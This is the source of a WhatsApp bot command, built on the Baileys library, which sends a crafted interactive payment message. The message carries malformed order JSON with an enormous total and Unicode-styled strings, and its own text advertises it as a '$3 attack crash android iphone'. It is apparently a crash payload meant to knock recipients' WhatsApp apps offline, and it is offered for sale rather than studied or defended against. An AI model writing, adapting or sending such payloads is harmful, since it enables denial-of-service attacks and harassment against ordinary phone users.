import * as crypto from 'crypto'
import pkg from '@whiskeysockets/baileys'
const { generateMessageID, prepareWAMessageMedia } = pkg

const snippetPagoCommand = {
    name: 'snippetpago',
    alias: ['pago-snippet-ai', 'snippet'],
    category: 'ai',
    run: async (m, { conn }) => {
        try {
            const pay = () => {
                return JSON.stringify({
                    currency: 'USD',
                    total_amount: { value: 12000000000, offset: 100 },
                    reference_id: '𝖃𝖊𝖔𝖓 🦄ユニコード',
                    type: 'https://paypal.me/CarlosFiden410/12',
                    order: {
                        status: 'payment_requested',
                        subtotal: { value: 10000, offset: 100 },
                        tax: { value: 5600, offset: 100 },
                        discount: { value: 3000, offset: 100 },
                        shipping: { value: 20000, offset: 100 },
                        order_type: 'ORDER',
                        items: [{ retailer_id: '00000000', product_id: '000000', name: '𝖃𝖊𝖔𝖓 🦄ユニコード', amount: { value: 10000, offset: 100 }, quantity: 100 }]
                    },
                    native_payment_methods: [],
                    share_payment_status: false
                })
            }

            const media = await prepareWAMessageMedia(
                { image: { url: 'https://raw.githubusercontent.com/Trunkslaks/2take1fotos/aaade96f9cca75fcd7877fa034a35a5a118d20c2/Menu3.jpg' } },
                { upload: conn.waUploadToServer }
            )

            const messageContent = {
                interactiveMessage: {
                    body: { 
                        text: '``` plugin: pago-nativo.js```\n\n$3 attack crash android iphone' 
                    },
                    footer: { text: 'KIRITO BOT' },
                    header: {
                        title: 'DG 𝕮𝖆𝖗𝖑𝖔𝖘',
                        hasMediaAttachment: true,
                        ...media
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: 'review_and_pay',
                            buttonParamsJson: pay()
                        }],
                        messageVersion: 1
                    }
                }
            }

            const stanza = [{ attrs: { native_flow_name: 'order_details' }, tag: 'biz' }]

            await conn.relayMessage(m.chat, messageContent, {
                messageId: generateMessageID(),
                additionalNodes: stanza
            })

        } catch (err) {
            console.error(err)
        }
    }
}

export default snippetPagoCommand
